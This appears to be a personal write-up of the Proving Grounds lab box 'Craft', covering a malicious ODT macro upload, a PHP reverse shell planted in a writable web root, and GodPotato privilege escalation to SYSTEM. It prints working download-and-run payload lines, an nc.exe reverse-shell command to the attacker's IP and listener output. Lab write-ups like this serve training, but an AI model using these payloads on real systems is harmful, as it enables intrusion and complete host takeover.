---
machine: Craft
platform: Proving Grounds
category: Windows
difficulty: Medium
tags: [file-upload, odt-macro, lateral-movement, seimpersonate, godpotato]
date: 2026-07-24
status: retired
summary: A Windows box serving a résumé-upload web form — testing an OpenDocument macro payload to smuggle a reverse shell past a filetype check, lateral movement into a webapp service account via a writable web root, and a SeImpersonatePrivilege abuse tool to finish as SYSTEM.
---

## Enumeration

nmap scan:

```bash
┌──(kali㉿kali)-[~/oscp/pebbles]
└─$ nmap-full 192.168.133.169
[*] Running fast port discovery on 192.168.133.169...
[*] Open ports: 80
[*] Running full scan on 192.168.133.169...
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-24 22:51 -0400
Nmap scan report for 192.168.133.169
Host is up (0.030s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: Craft

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.16 seconds
```

We find only a webapp. Upon opening it up we see an upload file field which we will attempt to exploit.

We feroxbust it and see: `http://target/upload.php`

Upon clicking it we see:
`File is not valid. Please submit ODT file`

## Foothold

We can assume we need to make a revshell in a ODT macro. I will use a tool like the one I used in [[Hepet]]: https://github.com/0bfxgh0st/MMG-LO

We download mmg-odt.py and revise the payload, swapping out build_payload for:

```powershell
build_payload = (r'''iwr -uri http://192.168.45.153:9999/reverse.exe -OutFile C:\Windows\Temp\rev.exe; C:\Windows\Temp\rev.exe''')
```

I then generate a revshell with msfvenom and host it on my python server on 9999. The revshell will shell to port 80 where I run my netcat listener with sudo privs.

```bash
┌──(kali㉿kali)-[~/oscp/craft]
└─$ python3 mmg-odt.py windows 192.168.45.153 80
[+] Payload: windows reverse shell
[+] Creating malicious .odt file

Done.
```

We submit the `file.odt` and get message: `You're resume was submitted , it will be reviewed shortly by our staff`

Shortly after our listener catches a shell:

```bash
┌──(kali㉿kali)-[~/oscp/craft]
└─$ sudo rlwrap -cAr nc -lvnp 80
[sudo] password for kali: 
listening on [any] 80 ...
connect to [192.168.45.153] from (UNKNOWN) [192.168.133.169] 49809
Microsoft Windows [Version 10.0.17763.2029]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files\LibreOffice\program>whoami
whoami
craft\thecybergeek
```

## Privilege Escalation

We run winpeas and find some interesting things:

```text
 Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles]
    
    Folder: C:\java\jre\bin
    FolderPerms: Users [Allow: AppendData/CreateDirectories WriteData/CreateFiles]
    File: C:\java\jre\bin\jp2ssv.dll
```

Theres a unique C:\java\jre directory we seem to have privs over that may prove to be a privesc vector if misconfigured or executed via Administrator

```text
C:\java\jre(Users [Allow: AppendData/CreateDirectories WriteData/CreateFiles])
```

```text
 ResumeService1(ResumeService1)[C:\Program Files\nssm-2.24\win64\nssm.exe] - Auto - Running - No quotes and Space detected
```

After investigating these vectors further, I felt that I couldn't go further with them. I decide to attempt lateral movement to our apache user to maybe gain a more clear privesc.

With a little bit of though this can be easily achieved as we find we can write to C:\xampp\htdocs and add our own php reverse shell and access it via the webapp.

For the revshell I use ivan's php revshell via port 4444

```powershell
PS C:\xampp\htdocs> iwr -uri http://192.168.45.153:8888/4444.php -Outfile ./4444.php

┌──(kali㉿kali)-[~/oscp/craft]
└─$ rlwrap -cAr nc -lvnp 4444 
listening on [any] 4444 ...
connect to [192.168.45.153] from (UNKNOWN) [192.168.133.169] 50066
SOCKET: Shell has connected! PID: 3928
Microsoft Windows [Version 10.0.17763.2029]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs>whoami
craft\apache
```

We immediately run whoami /priv and our eyes light up with glee as we notice `SeImpersonatePrivilege`:

```powershell
C:\xampp\htdocs>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeTcbPrivilege                Act as part of the operating system       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

We upload godpotato and another revshell:

```powershell
PS C:\xampp\htdocs> iwr -uri http://192.168.45.153:9999/godpotato4.exe -Outfile ./godpotato.exe
PS C:\xampp\htdocs> dir


    Directory: C:\xampp\htdocs


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        7/13/2021   3:18 AM                assets                                                                
d-----        7/13/2021   3:18 AM                css                                                                   
d-----        7/13/2021   3:18 AM                js                                                                    
d-----        7/24/2026   8:02 PM                uploads                                                               
-a----        7/24/2026   8:54 PM           9296 4444.php                                                              
-a----        7/24/2026   9:00 PM          57344 godpotato.exe                                                         
-a----         7/7/2021  10:53 AM           9635 index.php                                                             
-a----        7/24/2026   8:50 PM             56 shell.php                                                             
-a----         7/7/2021   9:56 AM            835 upload.php   
```

Strangely our shell connects and then kills itself:

```bash
C:\xampp\htdocs>godpotato.exe -cmd "C:\xampp\htdocs\5555.exe"

┌──(kali㉿kali)-[~/oscp/craft]
└─$ rlwrap -cAr nc -lvnp 5555
listening on [any] 5555 ...
connect to [192.168.45.153] from (UNKNOWN) [192.168.133.169] 50087
```

We could instead get it to spawn a system service which executes a shell for us, but I am just going to have it call an uploaded nc.exe to hit my listener for a more stable shell as system:

```powershell
C:\xampp\htdocs>GodPotato.exe -cmd "cmd.exe /c C:\users\thecybergeek\documents\nc.exe -e cmd.exe 192.168.45.153 5555"   
[*] CombaseModule: 0x140725486026752
[*] DispatchTable: 0x140725488340160
[*] UseProtseqFunction: 0x140725487717088
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\de0399f2-fcc7-4cc3-b0bf-e9430492b881\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00005c02-0b80-ffff-6a57-05cf77a77da1
[*] DCOM obj OXID: 0x42bb1e648adc537a
[*] DCOM obj OID: 0x258f01473c8a5cf5
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 876 Token:0x812  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 4152
```

Now with a shell as SYSTEM we go to the Administrator's desktop and get proof.txt. Box solved!

```powershell
C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 5C30-DCD7

 Directory of C:\Users\Administrator\Desktop

07/13/2021  03:38 AM    <DIR>          .
07/13/2021  03:38 AM    <DIR>          ..
07/24/2026  07:48 PM                34 proof.txt
               1 File(s)             34 bytes
```
